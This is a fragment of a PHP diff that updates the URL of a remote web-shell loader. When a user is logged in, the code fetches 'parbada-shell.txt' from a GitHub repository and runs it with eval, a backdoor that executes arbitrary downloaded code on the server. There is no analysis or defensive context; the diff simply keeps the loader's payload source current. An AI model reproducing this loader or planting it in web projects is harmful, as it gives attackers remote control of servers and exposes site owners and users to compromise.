@@ -58,7 +58,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://raw.githubusercontent.com/parbada/shell/main/parbada-shell.txt';
+    $destiny = 'https://raw.githubusercontent.com/parbadakeras/shel/refs/heads/main/parbada-shell.txt';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
